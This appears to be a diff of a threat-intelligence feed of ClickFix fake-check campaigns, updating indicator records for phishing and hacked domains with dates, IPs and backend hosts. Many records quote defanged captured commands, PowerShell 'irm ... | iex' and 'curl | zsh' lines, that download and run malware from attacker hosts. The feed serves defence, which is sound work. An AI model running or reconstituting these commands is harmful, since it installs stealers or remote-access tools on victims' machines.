@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5692,
+ "count": 5690,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -8578,7 +8578,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-02",
-   "last_seen": "2026-11-17",
+   "last_seen": "2026-11-18",
    "last_online": "2026-11-18",
    "offline_since": null,
    "url": "https://88win.store/",
@@ -8592,17 +8592,17 @@
    "country": null,
    "ips": [
     {
-     "ip": "104.21.30.66",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-03",
-     "last_seen": "2026-11-17"
-    },
-    {
      "ip": "172.67.172.54",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-02",
+     "last_seen": "2026-11-18"
+    },
+    {
+     "ip": "104.21.30.66",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-03",
      "last_seen": "2026-11-17"
     }
    ],
@@ -8611,7 +8611,7 @@
      "host": "88win.store",
      "status": "online",
      "first_seen": "2026-11-02",
-     "last_seen": "2026-11-17"
+     "last_seen": "2026-11-18"
     }
    ],
    "actor": null,
@@ -13822,7 +13822,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-30",
-   "last_seen": "2026-10-31",
+   "last_seen": "2026-11-18",
    "last_online": "2026-11-18",
    "offline_since": null,
    "url": "https://ae666l.space/",
@@ -13830,11 +13830,18 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "2606:4700:3031::6815:37f3",
+   "ip": "172.67.174.135",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "172.67.174.135",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-18",
+     "last_seen": "2026-11-18"
+    },
     {
      "ip": "2606:4700:3031::6815:37f3",
      "asn": "AS13335",
@@ -13848,7 +13855,7 @@
      "host": "ae666l.space",
      "status": "online",
      "first_seen": "2026-10-30",
-     "last_seen": "2026-10-31"
+     "last_seen": "2026-11-18"
     }
    ],
    "actor": null,
@@ -32672,7 +32679,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-11",
-   "last_seen": "2026-11-17",
+   "last_seen": "2026-11-18",
    "last_online": "2026-11-17",
    "offline_since": null,
    "url": "https://atgmanufacturingplc.com/",
@@ -32690,14 +32697,14 @@
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-16",
-     "last_seen": "2026-11-17"
+     "last_seen": "2026-11-18"
     },
     {
      "ip": "92.113.23.216",
      "asn": "AS47583",
      "org": "AS-HOSTINGER Hostinger International Limited, CY",
      "first_seen": "2026-11-17",
-     "last_seen": "2026-11-17"
+     "last_seen": "2026-11-18"
     },
     {
      "ip": "92.113.16.181",
@@ -32719,7 +32726,7 @@
      "host": "atgmanufacturingplc.com",
      "status": "online",
      "first_seen": "2026-11-11",
-     "last_seen": "2026-11-17"
+     "last_seen": "2026-11-18"
     }
    ],
    "actor": null,
@@ -38221,17 +38228,19 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
    ],
    "connects_to": [
     "xorados.com",
     "t-trustrest.com",
-    "groverudder12.com",
     "hagosuro.lc",
     "trek-72.com",
-    "trustchecknes.com"
+    "groverudder12.com",
+    "trustchecknes.com",
+    "j7tracker.gb.net",
+    "lepafonso.bz"
    ],
    "lure_from": [
     "interseq.at"
@@ -38353,8 +38362,8 @@
     "codes.browse-cdn.beer"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -48192,12 +48201,11 @@
     "cloud-browse.codes",
     "codes.browse-cdn.beer",
     "id-verfied.boats",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
+    "verifing-server.codes"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -62398,10 +62406,11 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/renf4y77/4e56-a2a2-[id]/FC-E2-1E-8C-32-20 | IEX",
-    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'he74km3k[.]dibay[.]store/?ublib=b21b9fd1-471c-4e41-84d9-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
-    "IRM fastly[.]jsdelivr[.]net/g\"h\"/adsr1163/49a6-8c52-[id]/[id] | IEX"
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'dnrvrbu9[.]trun[.]store/?ublib=68133ff4-77fe-4cf8-8a40-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
+    "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-[id]/-/raw/main/01a1e287-8de7-700c-802a-[id] | IEX"
    ],
    "connects_to": [
+    "dnrvrbu9.trun.store",
     "he74km3k.dibay.store"
    ],
    "lure_from": []
@@ -67455,12 +67464,11 @@
     "id-verfied.boats",
     "cloud-browse.codes",
     "codes.browse-cdn.beer",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
+    "verifing-server.codes"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -71133,10 +71141,10 @@
     "nikogdatakonebilo.cc",
     "yaebalciganovvjopu.org",
     "biboiboboorl.org",
+    "mango-oyster.cfd",
     "efreitorher.org",
     "yaponovosh.org",
-    "ciganshina.org",
-    "pakistanskimalchik.org"
+    "ciganshina.org"
    ]
   },
   {
@@ -77111,12 +77119,11 @@
     "id-verfied.boats",
     "cloud-browse.codes",
     "codes.browse-cdn.beer",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
+    "verifing-server.codes"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -88404,6 +88411,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "x8kn9c7z.trun.store",
     "1fu6at9l.gagu.store",
     "jl8clhwz.kotik.store",
     "0mizbl78.bittu.store"
@@ -90283,12 +90291,11 @@
     "codes.browse-cdn.beer",
     "ncheck-brows.beer",
     "id-verfied.boats",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
+    "verifing-server.codes"
    ],
    "lure_from": [
-    "codes.caffe-img.com",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -90394,6 +90401,7 @@
     "hagosuro.lc",
     "t-trustrest.com",
     "github.pw",
+    "j7tracker.gb.net",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -95880,6 +95888,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "8b325zs5.trun.store",
     "973dp3za.gagu.store",
     "l4168bvh.kotik.store",
     "ogqvw9pk.bittu.store"
@@ -97706,6 +97715,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "wiak6d6s.trun.store",
     "c58075sb.gagu.store",
     "e2d7s1m0.kotik.store",
     "ebul7e9w.bittu.store"
@@ -99239,6 +99249,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "b8z6s1fd.trun.store",
     "39rpkee0.gagu.store",
     "szgot9vm.kotik.store",
     "lwl1cqk2.bittu.store"
@@ -100087,6 +100098,7 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
+    "hs5ifxol.trun.store",
     "72i1vb48.gagu.store",
     "cyohtyen.kotik.store",
     "itwxrsvo.bittu.store"
@@ -102858,77 +102870,6 @@
    ]
   },
   {
-   "indicator": "espacesante-suisse.ch",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-17",
-   "last_seen": "2026-11-05",
-   "last_online": "2026-11-18",
-   "offline_since": null,
-   "url": "https://www.espacesante-suisse.ch/",
-   "brand": null,
-   "product": null,
-   "hosting": "AS Infomaniak Network SA",
-   "dns": "infomaniak.com",
-   "ip": "2001:1600:0:aaaa::80:c",
-   "asn": "AS29222",
-   "org": "Infomaniak-AS Infomaniak Network SA, CH",
-   "country": "CH",
-   "ips": [
-    {
-     "ip": "2001:1600:0:aaaa::80:c",
-     "asn": "AS29222",
-     "org": "Infomaniak-AS Infomaniak Network SA, CH",
-     "first_seen": "2026-10-18",
-     "last_seen": "2026-11-05"
-    },
-    {
-     "ip": "185.125.27.15",
-     "asn": null,
-     "org": null,
-     "first_seen": "2026-10-17",
-     "last_seen": "2026-10-17"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "espacesante-suisse.ch",
-     "status": "online",
-     "first_seen": "2026-10-17",
-     "last_seen": "2026-10-17"
-    },
-    {
-     "host": "www.espacesante-suisse.ch",
-     "status": "online",
-     "first_seen": "2026-10-18",
-     "last_seen": "2026-11-05"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'jscdncloude[.]beer/[id]'|iex;",
-    "irm 'id-verfied.boats/[id]'|iex;",
-    "irm 'cloud-browse[.]codes/[id]'|iex;"
-   ],
-   "connects_to": [
-    "jscdncloude.beer",
-    "ncheck-brows.beer",
-    "id-verfied.boats",
-    "cloud-browse.codes",
-    "codes.browse-cdn.beer",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
-   ],
-   "lure_from": [
-    "codes.caffe-img.com"
-   ]
-  },
-  {
    "indicator": "espaciosenmadera.com",
    "type": "domain",
    "category": "clickfix",
@@ -104621,14 +104562,14 @@
    "actor_link": null,
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')"
+    "(irm 'hxxps[:]//lepafonso[.]bz/proliv_dante/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|&('i'+'e'+'x')",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
    ],
    "connects_to": [
     "hagosuro.lc",
+    "lepafonso.bz",
     "xorados.com",
     "trek-72.com",
-    "lepafonso.bz",
     "github.pw",
     "t-trustresnew.com",
     "t-trustrest.com"
@@ -126227,18 +126168,18 @@
     "trek-72.com",
     "t-trustrest.com",
     "jscdncloude.beer",
+    "j7tracker.gb.net",
     "ncheck-brows.beer",
     "github.pw",
     "t-trustresnew.com",
-    "lepafonso.bz",
-    "trustchecknes.com"
+    "lepafonso.bz"
    ],
    "lure_from": [
     "interseq.at",
     "id-verfied.boats",
     "codes.browse-cdn.beer",
-    "codes.caffe-img.com",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -132742,7 +132683,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-31",
-   "last_seen": "2026-11-03",
+   "last_seen": "2026-11-18",
    "last_online": "2026-11-18",
    "offline_since": null,
    "url": "https://haywin.fit/",
@@ -132750,11 +132691,18 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "188.114.96.12",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "188.114.96.12",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-18",
+     "last_seen": "2026-11-18"
+    },
     {
      "ip": "188.114.97.3",
      "asn": "AS13335",
@@ -132782,7 +132730,7 @@
      "host": "haywin.fit",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-11-03"
+     "last_seen": "2026-11-18"
     }
    ],
    "actor": null,
@@ -139957,6 +139905,7 @@
    "actor_link": null,
    "commands": [
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/renf4y77/4e56-a2a2-[id]/FC-E2-1E-8C-32-20 | IEX",
+    "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-[id]/-/raw/main/01a1e287-8de7-700c-802a-[id] | IEX",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/adsr1163/49a6-8c52-[id]/[id] | IEX"
    ],
    "connects_to": [],
@@ -168077,7 +168026,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-17",
-   "last_seen": "2026-11-17",
+   "last_seen": "2026-11-18",
    "last_online": "2026-11-17",
    "offline_since": null,
    "url": "https://lauramarrone.ar/",
@@ -168095,7 +168044,7 @@
      "asn": "AS16276",
      "org": "OVH OVH SAS, FR",
      "first_seen": "2026-11-17",
-     "last_seen": "2026-11-17"
+     "last_seen": "2026-11-18"
     }
    ],
    "hosts": [
@@ -168103,7 +168052,7 @@
      "host": "lauramarrone.ar",
      "status": "online",
      "first_seen": "2026-11-17",
-     "last_seen": "2026-11-17"
+     "last_seen": "2026-11-18"
     }
    ],
    "actor": null,
@@ -205634,22 +205583,22 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
     "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "irm 'code[.]nvc-info[.]beer/[id]'|iex"
+    "irm 'codes[.]browse-cdn[.]beer/[id]'|iex"
    ],
    "connects_to": [
     "xorados.com",
     "groverudder12.com",
     "t-trustrest.com",
-    "code.nvc-info.beer",
     "codes.browse-cdn.beer",
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "code.nvc-info.beer"
    ],
    "lure_from": [
     "interseq.at",
     "jscdncloude.beer",
     "cloud-browse.codes",
-    "codes.caffe-img.com",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "codes.caffe-img.com"
    ]
   },
   {
@@ -208498,63 +208447,6 @@
    ]
   },
   {
-   "indicator": "pachamamaroteisland.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-19",
-   "last_seen": "2026-11-17",
-   "last_online": "2026-11-18",
-   "offline_since": null,
-   "url": "https://www.pachamamaroteisland.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "ASN Aruba S.p.A.",
-   "dns": "technorail.com",
-   "ip": "89.46.109.28",
-   "asn": "AS31034",
-   "org": "ARUBA-ASN Aruba S.p.A., IT",
-   "country": "IT",
-   "ips": [
-    {
-     "ip": "89.46.109.28",
-     "asn": "AS31034",
-     "org": "ARUBA-ASN Aruba S.p.A., IT",
-     "first_seen": "2026-10-19",
-     "last_seen": "2026-11-17"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.pachamamaroteisland.com",
-     "status": "online",
-     "first_seen": "2026-10-19",
-     "last_seen": "2026-11-17"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'jscdncloude[.]beer/[id]'|iex;",
-    "irm 'id-verfied.boats/[id]'|iex;",
-    "irm 'cloud-browse[.]codes/[id]'|iex;"
-   ],
-   "connects_to": [
-    "jscdncloude.beer",
-    "ncheck-brows.beer",
-    "id-verfied.boats",
-    "cloud-browse.codes",
-    "codes.browse-cdn.beer"
-   ],
-   "lure_from": [
-    "codes.caffe-img.com",
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "pacificfloorandcoatingmetrovancouver.com",
    "type": "domain",
    "category": "clickfix",
@@ -208683,7 +208575,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-11-17",
-   "last_seen": "2026-11-17",
+   "last_seen": "2026-11-18",
    "last_online": "2026-11-17",
    "offline_since": null,
    "url": "https://pacificfucoidan.com/",
@@ -208701,7 +208593,7 @@
      "asn": "AS26347",
      "org": "DREAMHOST-AS - New Dream Network, LLC, US",
      "first_seen": "2026-11-17",
-     "last_seen": "2026-11-17"
+     "last_seen": "2026-11-18"
     }
    ],
    "hosts": [
@@ -208709,7 +208601,7 @@
      "host": "pacificfucoidan.com",
      "status": "online",
      "first_seen": "2026-11-17",
-     "last_seen": "2026-11-17"
+     "last_seen": "2026-11-18"
     }
    ],
    "actor": null,
@@ -212742,11 +212634,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "j7tracker.gb.net",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -235900,10 +235793,10 @@
     "abcsgftr.cc",
     "nikogdatakonebilo.cc",
     "biboiboboorl.org",
+    "mango-oyster.cfd",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
-    "pizdalisibivet.org",
-    "yaponovosh.org"
+    "pizdalisibivet.org"
    ]
   },
   {
@@ -308418,11 +308311,18 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "104.21.76.177",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "104.21.76.177",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-17",
+     "last_seen": "2026-11-18"
+    },
     {
      "ip": "188.114.96.3",
      "asn": "AS13335",
@@ -308435,13 +308335,6 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-15",
-     "last_seen": "2026-11-18"
-    },
-    {
-     "ip": "104.21.76.177",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-17",
      "last_seen": "2026-11-18"
     }
    ],
@@ -311372,8 +311265,8 @@
     "ubbrobccheck20.cc"
    ],
    "lure_from": [
-    "verifyidentrob01.cc",
     "fudcomcheck.art",
+    "verifyidentrob01.cc",
     "fcdnbovres.cc",
     "govrobczxc.cc",
     "ocscdetec22.cc"
@@ -311444,7 +311337,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-31",
-   "last_seen": "2026-11-03",
+   "last_seen": "2026-11-18",
    "last_online": "2026-11-18",
    "offline_since": null,
    "url": "https://zx88t.xyz/",
@@ -311462,7 +311355,7 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-11-03"
+     "last_seen": "2026-11-18"
     },
     {
      "ip": "104.21.61.223",
@@ -311491,7 +311384,7 @@
      "host": "zx88t.xyz",
      "status": "online",
      "first_seen": "2026-10-31",
-     "last_seen": "2026-11-03"
+     "last_seen": "2026-11-18"
     }
    ],
    "actor": null,
